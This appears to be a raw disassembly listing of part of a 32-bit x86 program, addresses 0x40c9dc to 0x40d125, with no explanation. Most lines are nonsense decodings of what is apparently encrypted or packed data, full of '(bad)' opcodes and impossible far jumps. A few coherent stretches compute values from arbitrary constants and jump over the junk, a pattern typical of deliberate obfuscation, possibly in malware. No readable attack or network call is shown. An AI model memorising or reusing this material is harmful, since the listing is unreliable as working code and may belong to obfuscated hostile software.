  40c9dc:	div    DWORD PTR [edi+eax*1+0x72]
  40c9e0:	adc    dh,BYTE PTR fs:[edi-0x7ff38a2b]
  40c9e7:	(bad)  
  40c9e9:	xchg   ecx,eax
  40c9ea:	push   eax
  40c9eb:	mov    ds:0xe83bbd46,eax
  40c9f0:	retf   0x363a
  40c9f3:	pop    ds
  40c9f4:	test   esi,ecx
  40c9f6:	inc    ebx
  40c9f7:	pop    ebp
  40c9f8:	rol    edx,1
  40c9fa:	jbe    0x40c97e
  40c9fc:	cs mov bl,0x14
  40c9ff:	cmp    DWORD PTR [ebx+esi*8+0x1fdcb37b],ecx
  40ca06:	xchg   ecx,eax
  40ca07:	sti    
  40ca08:	leave  
  40ca09:	sub    DWORD PTR [edi+0x4090be64],ebp
  40ca0f:	out    dx,al
  40ca10:	cmc    
  40ca11:	in     eax,dx
  40ca12:	adc    dl,BYTE PTR [ecx+ebx*8-0x1e]
  40ca16:	lods   eax,DWORD PTR ds:[esi]
  40ca17:	es hlt 
  40ca19:	add    edx,edi
  40ca1b:	fs ins DWORD PTR es:[edi],dx
  40ca1d:	cmc    
  40ca1e:	xchg   ecx,eax
  40ca1f:	add    al,0x97
  40ca21:	and    BYTE PTR [edx+esi*8],bh
  40ca24:	jmp    0x40ca80
  40ca26:	fxch   st(5)
  40ca28:	out    0xb8,eax
  40ca2a:	jmp    0x40ca83
  40ca2c:	sub    dl,ah
  40ca2e:	pop    edi
  40ca2f:	(bad)  
  40ca30:	fidivr DWORD PTR [esi-0x31]
  40ca33:	add    edx,ebx
  40ca35:	pushf  
  40ca36:	xor    BYTE PTR [edx-0x1d721ae9],0x10
  40ca3d:	push   eax
  40ca3e:	push   ds
  40ca3f:	xlat   BYTE PTR ds:[ebx]
  40ca40:	stos   BYTE PTR es:[edi],al
  40ca41:	adc    bl,BYTE PTR [edi+0x63a85297]
  40ca47:	xchg   esi,eax
  40ca48:	add    eax,0xeb4fb6e7
  40ca4d:	out    0x5f,al
  40ca4f:	iret   
  40ca50:	aas    
  40ca51:	ds pop esp
  40ca53:	cld    
  40ca54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca55:	enter  0x8c4,0x7e
  40ca59:	xor    al,0x74
  40ca5b:	clc    
  40ca5c:	stc    
  40ca5d:	aad    0x5f
  40ca5f:	outs   dx,DWORD PTR ds:[esi]
  40ca60:	adc    eax,0x517a624e
  40ca65:	lock xlat BYTE PTR ds:[ebx]
  40ca67:	push   DWORD PTR [ecx+ecx*8+0xd0ad941]
  40ca6e:	adc    BYTE PTR ds:0x9cd3c1b3,0xde
  40ca75:	push   edi
  40ca76:	jmp    0x5c9baf10
  40ca7b:	outs   dx,BYTE PTR ds:[esi]
  40ca7c:	mov    ds:0xafde2662,al
  40ca81:	xor    BYTE PTR [eax],bl
  40ca83:	mov    eax,0x872d7dbf
  40ca88:	mov    eax,ds:0x5fdbe48f
  40ca8d:	cmp    edi,DWORD PTR [esi+0x76]
  40ca90:	fsubrp st(7),st
  40ca92:	popf   
  40ca93:	mov    dl,0x80
  40ca95:	fld    DWORD PTR [ecx-0x47]
  40ca98:	bswap  esi
  40ca9a:	cmp    ebp,DWORD PTR [edi]
  40ca9c:	sbb    dh,BYTE PTR [ebx+0x72469f55]
  40caa2:	aam    0xd0
  40caa4:	dec    esi
  40caa5:	mov    cl,0x7b
  40caa7:	(bad)  
  40caa8:	lock repz sub ebx,edi
  40caac:	aam    0xae
  40caae:	jno    0x40caa8
  40cab0:	aad    0x64
  40cab2:	icebp  
  40cab3:	stos   BYTE PTR es:[edi],al
  40cab4:	jp     0x40ca90
  40cab6:	outs   dx,BYTE PTR ds:[esi]
  40cab7:	outs   dx,DWORD PTR ds:[esi]
  40cab8:	addr16 jns 0x40ca51
  40cabb:	mov    dh,BYTE PTR [ecx+0xd040479]
  40cac1:	hlt    
  40cac2:	or     bl,BYTE PTR [eax+0x53]
  40cac5:	and    eax,0xbd49dae9
  40caca:	jnp    0x40ca8f
  40cacc:	lock and ch,BYTE PTR [ebp-0x4f578806]
  40cad3:	loope  0x40cb2d
  40cad5:	adc    ebp,DWORD PTR [eax]
  40cad7:	dec    ebx
  40cad8:	sub    eax,0x9fd0c1b4
  40cadd:	daa    
  40cade:	test   esi,0xef1d8a9f
  40cae4:	stos   DWORD PTR es:[edi],eax
  40cae5:	xor    ecx,DWORD PTR [edi+0x1f]
  40cae8:	push   eax
  40cae9:	jmp    0x40ca91
  40caeb:	jns    0x40cb67
  40caed:	add    BYTE PTR [eax+0x1c714f9f],al
  40caf3:	int    0x69
  40caf5:	(bad)  
  40caf7:	fwait
  40caf8:	pop    eax
  40caf9:	(bad)  
  40cafa:	pusha  
  40cafb:	and    BYTE PTR [esi-0x6d],0x5
  40caff:	jb     0x40cb57
  40cb01:	lahf   
  40cb02:	test   BYTE PTR [ebx+0x16],ch
  40cb05:	adc    bh,0x81
  40cb08:	jbe    0x40cb68
  40cb0a:	in     al,dx
  40cb0b:	in     al,0xc2
  40cb0d:	jp     0x40cb1e
  40cb0f:	out    dx,eax
  40cb10:	addr16 dec esp
  40cb12:	jae    0x40cada
  40cb14:	or     dh,BYTE PTR [ebx]
  40cb16:	push   0x9c888f5b
  40cb1b:	jb     0x40cb1f
  40cb1d:	and    bh,al
  40cb1f:	jg     0x40caeb
  40cb21:	inc    esp
  40cb22:	fldenv [ebx+ebp*4-0x9]
  40cb27:	xlat   BYTE PTR ds:[ebx]
  40cb28:	cmp    edx,DWORD PTR [edi]
  40cb2a:	pop    edx
  40cb2b:	mov    ebp,0x973cf027
  40cb30:	mov    esi,0xb5352a17
  40cb35:	jg     0x40cb65
  40cb37:	leave  
  40cb38:	(bad)  [ecx]
  40cb3a:	and    eax,0xd2a2e046
  40cb3f:	sbb    DWORD PTR [eax],eax
  40cb41:	(bad)  
  40cb42:	sub    BYTE PTR [edx+edx*1],0xc2
  40cb46:	adc    DWORD PTR [ecx],ebp
  40cb48:	dec    esp
  40cb49:	push   ebx
  40cb4a:	push   eax
  40cb4b:	mov    ebp,cs
  40cb4d:	jae    0x40cada
  40cb4f:	int    0x12
  40cb51:	ja     0x40cb3a
  40cb53:	or     eax,0x29340103
  40cb58:	fimul  WORD PTR [ecx-0x1c437381]
  40cb5e:	xor    esi,DWORD PTR [edi-0x59]
  40cb61:	cdq    
  40cb62:	inc    ebx
  40cb63:	daa    
  40cb64:	cmp    DWORD PTR [ecx],0x56162a33
  40cb6a:	and    bl,BYTE PTR [edx+edx*1+0x16]
  40cb6e:	pop    ebx
  40cb6f:	leave  
  40cb70:	dec    DWORD PTR [ebx]
  40cb72:	push   0x5f7ae6bf
  40cb77:	dec    edi
  40cb78:	daa    
  40cb79:	clc    
  40cb7a:	js     0x40cb5c
  40cb7c:	pop    edx
  40cb7d:	ins    DWORD PTR es:[edi],dx
  40cb7e:	repnz retf 0x1fd
  40cb82:	adc    bh,BYTE PTR [edi-0x62]
  40cb85:	aas    
  40cb86:	aas    
  40cb87:	jp     0x40cb31
  40cb89:	xchg   ebp,eax
  40cb8a:	mov    ch,0xe2
  40cb8c:	aad    0xb6
  40cb8e:	dec    ebp
  40cb8f:	pusha  
  40cb90:	push   ebx
  40cb91:	lock fs mov esp,0x92cd944
  40cb98:	clc    
  40cb99:	fucomip st,st(4)
  40cb9b:	cmc    
  40cb9c:	xor    DWORD PTR [ecx+ebp*4],0x6
  40cba0:	rol    DWORD PTR [eax+0x3bd7255b],0x50
  40cba7:	pop    es
  40cba8:	imul   ebp,ebx,0xffffff94
  40cbab:	adc    edx,DWORD PTR [ecx*8-0x7b991cec]
  40cbb2:	out    dx,al
  40cbb3:	test   eax,0xcd350434
  40cbb8:	cmc    
  40cbb9:	adc    ecx,esp
  40cbbb:	push   es
  40cbbc:	(bad)  
  40cbbd:	fnstenv [edi]
  40cbbf:	push   es
  40cbc0:	loop   0x40cba3
  40cbc2:	scas   eax,DWORD PTR es:[edi]
  40cbc3:	inc    edx
  40cbc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbc5:	std    
  40cbc6:	js     0x40cc0f
  40cbc8:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40cbca:	into   
  40cbcb:	sub    al,0x5e
  40cbcd:	mov    bh,0xb7
  40cbcf:	and    eax,0xc8ff06f0
  40cbd4:	jge    0x40cb84
  40cbd6:	stos   BYTE PTR es:[edi],al
  40cbd7:	dec    ebx
  40cbd8:	pushf  
  40cbd9:	push   ebx
  40cbda:	lea    ebx,[ebp-0x79]
  40cbdd:	add    ebx,DWORD PTR [eax]
  40cbdf:	jae    0x40cc06
  40cbe5:	mov    eax,DWORD PTR [ebp-0x18]
  40cbe8:	mov    edx,DWORD PTR [ebp-0x14]
  40cbeb:	shrd   eax,edx,0x2
  40cbef:	xor    eax,ecx
  40cbf1:	mov    ecx,DWORD PTR [ebp-0x18]
  40cbf4:	shr    edx,0x2
  40cbf7:	mov    edx,DWORD PTR [ebp-0x14]
  40cbfa:	xor    edx,edx
  40cbfc:	shl    ecx,0x1e
  40cbff:	or     eax,edx
  40cc01:	mov    ds:0x4226b0,eax
  40cc06:	pop    esi
  40cc07:	leave  
  40cc08:	ret    
  40cc09:	push   ebp
  40cc0a:	mov    ebp,esp
  40cc0c:	sub    esp,0x28
  40cc0f:	push   ebx
  40cc10:	push   esi
  40cc11:	push   edi
  40cc12:	mov    DWORD PTR [ebp-0x10],0x67e2
  40cc19:	mov    DWORD PTR [ebp-0x4],0x4726
  40cc20:	mov    DWORD PTR [ebp-0x8],0x580
  40cc27:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40cc2e:	mov    DWORD PTR [ebp-0x28],0x3294
  40cc35:	mov    DWORD PTR [ebp-0x24],0x643
  40cc3c:	mov    DWORD PTR [ebp-0x20],0x2545
  40cc43:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40cc4a:	xor    ebx,ebx
  40cc4c:	inc    ebx
  40cc4d:	mov    DWORD PTR [ebp-0x18],ebx
  40cc50:	mov    DWORD PTR [ebp-0x14],0x76b1
  40cc57:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc5a:	jmp    0x40cf1e
  40cc5f:	sub    edi,ebx
  40cc61:	sti    
  40cc62:	xchg   edi,eax
  40cc63:	sbb    dl,BYTE PTR [edi+0x7d189a1a]
  40cc69:	xor    DWORD PTR [eax-0x41114c6b],0x1818edb9
  40cc73:	rcl    BYTE PTR [eax+ebx*1],cl
  40cc76:	sbb    al,dl
  40cc78:	jae    0x40ccef
  40cc7a:	clc    
  40cc7b:	out    dx,eax
  40cc7c:	rol    DWORD PTR [edi],0x48
  40cc7f:	inc    DWORD PTR [ecx]
  40cc81:	test   BYTE PTR [edx+0x2dc32e1e],bl
  40cc87:	jmp    0xd9fb:0x2f057301
  40cc8e:	push   ss
  40cc8f:	scas   al,BYTE PTR es:[edi]
  40cc90:	or     esp,ebp
  40cc92:	fst    st(7)
  40cc94:	or     DWORD PTR [ebp-0x8],ebp
  40cc97:	cld    
  40cc98:	pusha  
  40cc99:	mov    eax,DWORD PTR [edx-0x24]
  40cc9c:	push   ss
  40cc9d:	cmc    
  40cc9e:	push   ebx
  40cc9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cca0:	cdq    
  40cca1:	pop    ebx
  40cca2:	push   ebx
  40cca3:	cld    
  40cca4:	pop    ebp
  40cca5:	push   eax
  40cca6:	lods   eax,DWORD PTR ds:[esi]
  40cca7:	aad    0xa1
  40cca9:	pop    edi
  40ccaa:	sbb    DWORD PTR [ecx],ecx
  40ccac:	sub    al,0x9b
  40ccae:	dec    ebx
  40ccaf:	stos   BYTE PTR es:[edi],al
  40ccb0:	imul   edx,DWORD PTR fs:[edx],0x8311d88e
  40ccb7:	jecxz  0x40ccdf
  40ccb9:	stos   DWORD PTR es:[edi],eax
  40ccba:	popa   
  40ccbb:	jecxz  0x40cc4c
  40ccbd:	push   DWORD PTR [ebx+0x35]
  40ccc0:	dec    ebp
  40ccc1:	cdq    
  40ccc2:	or     eax,0x41c04b1f
  40ccc7:	jnp    0x40cd19
  40ccc9:	xor    DWORD PTR [ecx],esp
  40cccb:	int    0x62
  40cccd:	push   ebp
  40ccce:	lods   eax,DWORD PTR ds:[esi]
  40cccf:	test   al,0xf0
  40ccd1:	mov    dl,0x32
  40ccd3:	int    0xad
  40ccd5:	daa    
  40ccd6:	mov    ah,0x24
  40ccd8:	hlt    
  40ccd9:	xchg   ecx,eax
  40ccda:	dec    ebx
  40ccdb:	popa   
  40ccdc:	mov    dh,0xa2
  40ccde:	repnz mov ebx,DWORD PTR [eax+0x43]
  40cce2:	repz and bh,bl
  40cce5:	fdivr  QWORD PTR [eax+0x48]
  40cce8:	hlt    
  40cce9:	mov    dh,0xc4
  40cceb:	ins    BYTE PTR es:[edi],dx
  40ccec:	dec    DWORD PTR [edi+0x78]
  40ccef:	in     eax,0xc2
  40ccf1:	std    
  40ccf2:	sub    eax,0xd0c1cd5c
  40ccf7:	(bad)  
  40ccf8:	stos   BYTE PTR es:[edi],al
  40ccf9:	aaa    
  40ccfa:	pop    ss
  40ccfb:	xchg   edx,eax
  40ccfc:	lock cmp DWORD PTR [esi-0x358c7418],ebp
  40cd03:	add    eax,0x2f4c8139
  40cd08:	lds    edx,FWORD PTR [ebx]
  40cd0a:	sbb    ebx,DWORD PTR ds:0x2d889ab4
  40cd10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd11:	scas   al,BYTE PTR es:[edi]
  40cd12:	stos   BYTE PTR es:[edi],al
  40cd13:	adc    ebx,DWORD PTR gs:[esi+0x69]
  40cd17:	xchg   ecx,eax
  40cd18:	(bad)  
  40cd19:	into   
  40cd1a:	in     eax,0x4f
  40cd1c:	xchg   esp,eax
  40cd1d:	push   eax
  40cd1e:	pop    DWORD PTR [ebx]
  40cd20:	js     0x40cd7f
  40cd22:	inc    edi
  40cd23:	rol    DWORD PTR [ebx],cl
  40cd25:	outs   dx,BYTE PTR ds:[esi]
  40cd26:	loopne 0x40cd4e
  40cd28:	mov    eax,0xa2120c96
  40cd2d:	cs (bad) 
  40cd2f:	sub    DWORD PTR [edx],ebp
  40cd31:	loope  0x40cda9
  40cd33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd34:	sub    BYTE PTR [eax-0x3e],dl
  40cd37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd38:	ins    BYTE PTR es:[edi],dx
  40cd39:	fcom   DWORD PTR [esi+0x599dd6e3]
  40cd3f:	push   ebx
  40cd40:	sub    edx,DWORD PTR [ebx]
  40cd42:	retf   0x70f4
  40cd45:	test   BYTE PTR [ecx-0x7f],al
  40cd48:	repnz pop ecx
  40cd4a:	fwait
  40cd4b:	data16 xor al,0x18
  40cd4e:	cli    
  40cd4f:	mov    ds:0xfec4d23e,al
  40cd54:	paddq  mm6,QWORD PTR [edx-0x5b847125]
  40cd5b:	loopne 0x40cd5c
  40cd5d:	mov    dh,0x10
  40cd5f:	jp     0x40cd42
  40cd61:	xchg   ebx,eax
  40cd62:	(bad)  
  40cd63:	adc    dh,BYTE PTR [ebp-0x54]
  40cd66:	adc    BYTE PTR [ecx-0x48c43ed5],ah
  40cd6c:	(bad)  
  40cd6d:	push   cs
  40cd6e:	mov    BYTE PTR [ecx+edx*8+0x19032453],cl
  40cd75:	and    dh,al
  40cd77:	retf   0xce54
  40cd7a:	or     BYTE PTR [eax],cl
  40cd7c:	cmp    DWORD PTR [esi+eax*2+0x20],0xffffff85
  40cd81:	push   0xffffff9c
  40cd83:	sbb    ah,cl
  40cd85:	mov    esp,0x87d4601d
  40cd8a:	sub    eax,0x731681a8
  40cd8f:	addr16 mov ah,0x7c
  40cd92:	fwait
  40cd93:	or     BYTE PTR [esi+0x6755208],bl
  40cd99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd9a:	pop    eax
  40cd9b:	stc    
  40cd9c:	ds cli 
  40cd9e:	xor    DWORD PTR [edi+0x6c8a5f41],0xffffff99
  40cda5:	cdq    
  40cda6:	sbb    eax,0xac6903ca
  40cdab:	push   edi
  40cdac:	mov    eax,ss
  40cdae:	lods   eax,DWORD PTR ds:[esi]
  40cdaf:	mov    edx,db2
  40cdb2:	iret   
  40cdb3:	or     al,bh
  40cdb5:	mov    bl,0xe8
  40cdb7:	lds    ecx,FWORD PTR [eax-0x5b280bc1]
  40cdbd:	enter  0xbde5,0xab
  40cdc1:	mov    WORD PTR [ecx],fs
  40cdc3:	inc    ebx
  40cdc4:	scas   eax,DWORD PTR es:[edi]
  40cdc5:	xor    cl,dh
  40cdc7:	mov    eax,ds:0x4eb7d1d4
  40cdcc:	jle    0x40ce09
  40cdce:	iretw  
  40cdd0:	ret    0xa2dc
  40cdd3:	mov    ecx,0xf7b4988b
  40cdd8:	cld    
  40cdd9:	sahf   
  40cdda:	rcl    DWORD PTR [ecx],1
  40cddc:	addr16 out 0xf7,eax
  40cddf:	je     0x40cdd5
  40cde1:	mov    edi,0x2e76a685
  40cde6:	inc    ebx
  40cde7:	dec    ebx
  40cde8:	rcr    DWORD PTR [eax],0xc2
  40cdeb:	ds das 
  40cded:	push   cs
  40cdee:	mov    bh,0xa8
  40cdf0:	out    dx,al
  40cdf1:	mov    esp,0xeea6c540
  40cdf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdf7:	xchg   esi,eax
  40cdf8:	pop    es
  40cdf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdfa:	or     DWORD PTR [edi],esi
  40cdfc:	mov    esi,0x428e0e78
  40ce01:	mov    al,0x17
  40ce03:	inc    edi
  40ce04:	rcr    ebp,0xa9
  40ce07:	clc    
  40ce08:	ret    0xbfbe
  40ce0b:	fiadd  WORD PTR [ebx-0x65]
  40ce0e:	mov    ds:0xfec61b68,eax
  40ce13:	leave  
  40ce14:	mov    esp,fs
  40ce16:	test   DWORD PTR [edi-0x2f3a8624],0xeb25d92a
  40ce20:	or     DWORD PTR [ecx+edi*4+0x1a],edi
  40ce24:	inc    esp
  40ce25:	sub    DWORD PTR [esi+0x26],esp
  40ce28:	ret    0xfabd
  40ce2b:	inc    edi
  40ce2c:	jnp    0x40ce96
  40ce2e:	push   esi
  40ce2f:	call   0x1bc15af3
  40ce34:	inc    ebp
  40ce35:	and    DWORD PTR [ebx],ebp
  40ce37:	cli    
  40ce38:	(bad)  
  40ce39:	push   ecx
  40ce3a:	fwait
  40ce3b:	and    DWORD PTR [eax],esp
  40ce3d:	inc    edi
  40ce3e:	std    
  40ce3f:	pop    DWORD PTR [eax+0x6da0ec32]
  40ce45:	pop    esi
  40ce46:	ror    DWORD PTR [ecx-0x76],1
  40ce49:	ret    
  40ce4a:	pop    eax
  40ce4b:	inc    edi
  40ce4c:	mov    ds:0x22c2d69f,eax
  40ce51:	fsubr  st(4),st
  40ce53:	mov    cl,0x94
  40ce55:	shl    cl,1
  40ce57:	int    0x46
  40ce59:	xchg   ecx,eax
  40ce5a:	or     eax,0xa3cc218b
  40ce5f:	xchg   esi,eax
  40ce60:	cs sar DWORD PTR ds:[edx],1
  40ce64:	jmp    0xcdfc:0xb41e5c79
  40ce6b:	popa   
  40ce6c:	ret    
  40ce6d:	out    dx,eax
  40ce6e:	mov    eax,0xba3a6da6
  40ce73:	inc    edi
  40ce74:	es and eax,0xc02df7e
  40ce7a:	fsubp  st(6),st
  40ce7c:	lods   eax,DWORD PTR ds:[esi]
  40ce7d:	sti    
  40ce7e:	xor    esi,DWORD PTR [ecx+0x62]
  40ce81:	xchg   DWORD PTR [eax-0x51],eax
  40ce84:	cwde   
  40ce85:	ror    esp,0xe3
  40ce88:	xchg   edi,eax
  40ce89:	into   
  40ce8a:	outs   dx,BYTE PTR ds:[esi]
  40ce8b:	inc    ecx
  40ce8c:	(bad)  
  40ce8d:	cmp    ch,BYTE PTR [edi-0x2aba632d]
  40ce93:	fld1   
  40ce95:	jp     0x40ce5e
  40ce97:	or     DWORD PTR [ecx-0x35],0xffffffec
  40ce9b:	and    eax,0xb3257b03
  40cea0:	sbb    bh,dh
  40cea2:	jmp    0x40ce5a
  40cea4:	sti    
  40cea5:	ret    0x181a
  40cea8:	test   al,0x99
  40ceaa:	sbb    eax,0x2c721176
  40ceaf:	lea    ebx,[edi+0x4d]
  40ceb2:	mov    BYTE PTR cs:[edx+edi*2+0x15],cl
  40ceb7:	fld    DWORD PTR [ecx-0x41]
  40ceba:	sar    BYTE PTR [eax-0x7ef61633],cl
  40cec0:	ins    BYTE PTR es:[edi],dx
  40cec1:	outs   dx,BYTE PTR ds:[esi]
  40cec2:	ins    DWORD PTR es:[edi],dx
  40cec3:	inc    edi
  40cec4:	sahf   
  40cec5:	inc    eax
  40cec6:	out    dx,eax
  40cec7:	pop    es
  40cec8:	mov    ah,0x91
  40ceca:	lds    edx,FWORD PTR [edx-0x27d60e98]
  40ced0:	test   BYTE PTR [ebp+0x38b87082],0x2f
  40ced7:	stc    
  40ced8:	push   es
  40ced9:	sbb    al,0xe
  40cedb:	and    al,0x44
  40cedd:	cmp    ebx,esi
  40cedf:	pop    edi
  40cee0:	fidivr DWORD PTR [ecx+0x47]
  40cee3:	add    ebp,DWORD PTR [ecx-0x49]
  40cee6:	jp     0x40ce8b
  40cee8:	pop    edx
  40cee9:	sbb    eax,0xb40ed648
  40ceee:	push   edi
  40ceef:	pop    ss
  40cef0:	push   ebx
  40cef1:	icebp  
  40cef2:	les    ebx,FWORD PTR [edi-0x1d]
  40cef5:	adc    BYTE PTR ds:0xe3fb1b35,ah
  40cefb:	loopne 0x40cefd
  40cefd:	xor    ecx,DWORD PTR [edi+0x3c]
  40cf00:	cmp    eax,0x7b3c3408
  40cf05:	mov    ah,0x78
  40cf07:	xchg   esp,eax
  40cf08:	sahf   
  40cf09:	jp     0x40cf56
  40cf0b:	loope  0x40cedc
  40cf0d:	jmp    0x3ed4280f
  40cf12:	ss push edx
  40cf14:	or     DWORD PTR [esi],esp
  40cf16:	aam    0x46
  40cf18:	cld    
  40cf19:	retf   0xea0e
  40cf1c:	or     eax,0xfc458bdb
  40cf21:	sub    ecx,eax
  40cf23:	add    ecx,DWORD PTR [ebp-0xc]
  40cf26:	add    ecx,DWORD PTR [ebp-0x10]
  40cf29:	imul   ecx,ecx,0x1f80
  40cf2f:	add    ecx,0x727e
  40cf35:	xor    ecx,0x106c92f2
  40cf3b:	mov    DWORD PTR [ebp-0x8],0x113c
  40cf42:	mov    DWORD PTR [ebp-0xc],0x3d61
  40cf49:	mov    DWORD PTR [ebp-0x10],0x16e9
  40cf50:	mov    DWORD PTR [ebp-0x4],0x21aa
  40cf57:	mov    eax,DWORD PTR [ebp-0x10]
  40cf5a:	or     eax,0x3611
  40cf5f:	add    eax,DWORD PTR [ebp-0xc]
  40cf62:	mov    edx,DWORD PTR [ebp-0x8]
  40cf65:	and    eax,edx
  40cf67:	mov    edx,ecx
  40cf69:	sub    edx,eax
  40cf6b:	mov    eax,DWORD PTR [ebp-0x4]
  40cf6e:	mov    esi,DWORD PTR ds:0x4225a8
  40cf74:	mov    esi,DWORD PTR [esi+0x1cc]
  40cf7a:	add    eax,0x6772
  40cf7f:	or     eax,0x1f24
  40cf84:	sub    eax,0x7046
  40cf89:	xor    eax,0x497a
  40cf8e:	sub    esi,eax
  40cf90:	mov    eax,DWORD PTR [ebp+0x8]
  40cf93:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40cf9a:	jmp    0x40d25e
  40cf9f:	nop
  40cfa0:	xchg   ebx,eax
  40cfa1:	retf   
  40cfa2:	ja     0x40cf6e
  40cfa4:	das    
  40cfa5:	sub    al,0x6a
  40cfa7:	sbb    DWORD PTR [esi+0x3ef9bcd3],esi
  40cfad:	dec    ecx
  40cfae:	push   0x72
  40cfb0:	call   0x1512e7cd
  40cfb5:	sbb    BYTE PTR [eax],bl
  40cfb7:	ds leave 
  40cfb9:	into   
  40cfba:	es inc edi
  40cfbc:	inc    edx
  40cfbd:	addr16 mov bh,0x4c
  40cfc0:	in     al,0x22
  40cfc2:	fimul  WORD PTR [ebx]
  40cfc4:	mov    esp,ds
  40cfc6:	sbb    DWORD PTR [ebp+eax*8-0x6e83d77f],esp
  40cfcd:	and    eax,ebx
  40cfcf:	add    eax,0x1c095d30
  40cfd4:	mov    BYTE PTR [ebp-0x5a999294],cl
  40cfda:	lods   al,BYTE PTR ds:[esi]
  40cfdb:	inc    esi
  40cfdd:	mov    eax,0xd68b6b9b
  40cfe2:	mov    ss,WORD PTR [ebx+edi*8-0x7b]
  40cfe6:	rol    BYTE PTR [esi],cl
  40cfe8:	pop    edi
  40cfe9:	shl    BYTE PTR [edi+0x3e],1
  40cfec:	inc    ebx
  40cfed:	fist   DWORD PTR [esi+0x67]
  40cff0:	sub    DWORD PTR [eax-0x7b],ebx
  40cff3:	push   ss
  40cff4:	mov    edx,0x1ab2a3be
  40cff9:	pop    es
  40cffa:	push   esp
  40cffb:	add    cl,bh
  40cffd:	mov    cl,0x27
  40cfff:	aas    
  40d000:	mov    al,0x86
  40d002:	repnz sub BYTE PTR [ebp+0x5c],ah
  40d006:	pop    es
  40d007:	push   esp
  40d008:	cwde   
  40d009:	ins    BYTE PTR es:[edi],dx
  40d00a:	dec    esp
  40d00b:	stos   DWORD PTR es:[edi],eax
  40d00c:	dec    edx
  40d00d:	jle    0x40d02d
  40d00f:	jg     0x40d053
  40d011:	test   ah,bl
  40d013:	sbb    al,0x26
  40d015:	fdiv   QWORD PTR [esi]
  40d017:	jo     0x40cfe2
  40d019:	pop    eax
  40d01a:	and    dl,0xce
  40d01d:	daa    
  40d01e:	int    0x43
  40d020:	jae    0x40cff3
  40d022:	xchg   esi,eax
  40d023:	div    al
  40d025:	push   0x133f2f6b
  40d02a:	loopne 0x40cfc8
  40d02c:	loopne 0x40d041
  40d02e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d02f:	test   DWORD PTR [eax+0x35],0x7b99da3a
  40d036:	enter  0x459a,0xea
  40d03a:	mov    esi,0x947d0b99
  40d03f:	push   edx
  40d040:	cs xor al,0xeb
  40d043:	sar    DWORD PTR [ecx-0x66c30f04],cl
  40d049:	das    
  40d04a:	inc    ecx
  40d04b:	fs jle 0x40d0cd
  40d04e:	push   esi
  40d04f:	jp     0x40d061
  40d051:	cwde   
  40d052:	mov    eax,esi
  40d054:	jp     0x40d09f
  40d056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d057:	or     DWORD PTR [edx*1-0x281f0653],ebp
  40d05e:	fucomp st(1)
  40d060:	imul   esi,DWORD PTR [esi],0xf2c613f
  40d066:	mov    edi,0xfa4ed7ad
  40d06b:	pop    ds
  40d06c:	adc    eax,0x40fbf2b9
  40d071:	int    0xc3
  40d073:	mov    eax,ds:0xf33145c3
  40d078:	dec    eax
  40d079:	pop    edx
  40d07b:	pop    ebx
  40d07c:	xchg   edx,eax
  40d07d:	pop    ebp
  40d07e:	and    DWORD PTR [ecx],eax
  40d080:	pop    edx
  40d081:	add    esp,DWORD PTR [edi-0x48]
  40d084:	jl     0x40d04e
  40d086:	pop    esp
  40d087:	arpl   WORD PTR [ebx],si
  40d089:	pop    esi
  40d08a:	dec    edi
  40d08b:	das    
  40d08c:	add    BYTE PTR [esi+0x5],dh
  40d08f:	fsubr  st,st(1)
  40d091:	dec    ebx
  40d092:	cmp    DWORD PTR [edi+0x886b475],esi
  40d098:	inc    edx
  40d099:	xchg   edi,eax
  40d09a:	call   0x5f7f:0x255cdd1d
  40d0a1:	adc    eax,0xcb58fac5
  40d0a6:	(bad)  
  40d0a7:	std    
  40d0a8:	inc    eax
  40d0a9:	in     eax,dx
  40d0aa:	xchg   edi,eax
  40d0ab:	push   ecx
  40d0ac:	stos   BYTE PTR es:[edi],al
  40d0ad:	and    cl,BYTE PTR [ebp+0xa]
  40d0b0:	push   ecx
  40d0b1:	push   ebx
  40d0b2:	mov    bl,0x50
  40d0b4:	add    edi,DWORD PTR [edi+0x78]
  40d0b7:	out    dx,eax
  40d0b8:	xchg   esp,eax
  40d0b9:	xchg   di,ax
  40d0bb:	arpl   WORD PTR [edi+0x3cf10246],ax
  40d0c1:	mov    edx,0xb845e968
  40d0c6:	jne    0x40d0c0
  40d0c8:	dec    ebp
  40d0c9:	dec    edi
  40d0ca:	les    ecx,FWORD PTR [ecx-0x44]
  40d0cd:	sbb    BYTE PTR [eax+0x58b2e309],bh
  40d0d3:	mov    ecx,0xc0c6b225
  40d0d8:	xor    DWORD PTR [eax],0x9fbad19c
  40d0de:	out    dx,eax
  40d0df:	(bad)  
  40d0e0:	jp     0x40d120
  40d0e2:	inc    ebp
  40d0e3:	fidivr WORD PTR [esi+ebx*4]
  40d0e6:	pop    ebp
  40d0e7:	sbb    dl,BYTE PTR [eax]
  40d0e9:	sbb    al,ch
  40d0eb:	or     eax,0xa0e01104
  40d0f0:	cwde   
  40d0f1:	cmp    eax,0xfc67a582
  40d0f6:	add    ebx,DWORD PTR [eax]
  40d0f8:	jmp    0xac9:0xbe50ccfb
  40d0ff:	or     DWORD PTR [esi-0x5b],eax
  40d102:	lods   al,BYTE PTR ds:[esi]
  40d103:	enter  0x6abb,0x20
  40d107:	push   ds
  40d108:	mov    ebx,0xd776086f
  40d10d:	add    ebx,DWORD PTR [eax+0x7b19d4b6]
  40d113:	dec    ebx
  40d114:	jg     0x40d0f3
  40d116:	push   0x98a01913
  40d11b:	xchg   ebx,eax
  40d11c:	xor    esp,eax
  40d11e:	jnp    0x40d11f
  40d120:	inc    esi
  40d121:	dec    eax
  40d122:	(bad)  [esi-0x61]
  40d125:	jmp    0xa90a:0x56948fd6
